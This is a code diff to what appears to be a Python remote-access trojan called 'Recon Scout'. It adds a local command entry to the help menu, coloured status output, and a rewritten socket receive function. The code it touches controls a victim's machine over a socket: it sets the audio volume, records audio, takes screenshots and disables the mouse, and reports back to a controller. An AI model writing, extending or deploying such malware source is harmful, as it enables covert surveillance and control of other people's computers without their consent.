@@ -41,9 +41,10 @@ help_menu = '''\nRecon Scout Menu
 
    Global Commands :
       banner                            Display a banner
-      help                              Show the help menu
-      quit                              Quit the console
       clear                             Clear the screen
+      help                              Show the help menu
+      local <system command>            Locally execute a system command
+      quit                              Quit the console
    
    Connection commands :
       disconnect                        Make the scout disconnect and try to reconnect
@@ -69,14 +70,14 @@ def set_audio(number):
     interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
     volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
     range_vol = volume.GetVolumeRange()
-    s.sendall('[*]Max Volume number(100%) : ' + str(range_vol[1]))
+    s.sendall('[1m[34m[*][0mMax Volume number(100%) : ' + str(range_vol[1]))
     s.sendall('\n[*]Minimum Volume number(0%) : ' + str(range_vol[0]))
     s.sendall('\n[*]Setting volume to : ' + str(number))
     try:
         volume.SetMasterVolumeLevel(float(number), None)
-        s.send('\n[+]Volume set'+End)
+        s.send('\n[1m[32m[+][0mVolume set'+End)
     except:
-        s.send('\n[-]Error setting volume, invalid argument'+End)
+        s.send('\n[1m[31m[-][0mError setting volume, invalid argument'+End)
 
 
 def record_audio(seconds):
@@ -194,22 +195,24 @@ def disable_mouse():
         s.send('[-]Error disabling mouse interface : ' + str(e))
 
 
-def recvall(the_socket):
-    total_data = []
+def recvall(tar_socket):
+    data = tar_socket.recv(9999)
+    if not data:
+        return ''
     while True:
-        data = the_socket.recv(8192)
-        if End in data:
-            total_data.append(data[:data.find(End)])
-            break
-        total_data.append(data)
-        if len(total_data) > 1:
-            last_pair = total_data[-2] + total_data[-1]
-            if End in last_pair:
-                total_data[-2] = last_pair[:last_pair.find(End)]
-                total_data.pop()
-                break
-    return ''.join(total_data)
-
+        if data.endswith(End):
+            try:
+                tar_socket.settimeout(1)
+                more_data = tar_socket.recv(9999)
+                if not more_data:
+                    return data[:-len(End)]
+                data += more_data
+            except (socket.timeout,socket.error):
+                tar_socket.settimeout(None)
+                return data[:-len(End)]
+        else:
+            more_data = tar_socket.recv(9999)
+            data += more_data
 
 def screenshot():
     try:
@@ -236,6 +239,7 @@ def main():
         s.sendall(pickle.dumps(scout_data) + End)
         while True:
             try:
+                s.settimeout(None)
                 data = recvall(s).split(' ', 1)
                 command = data[0]
                 if command == 'help':
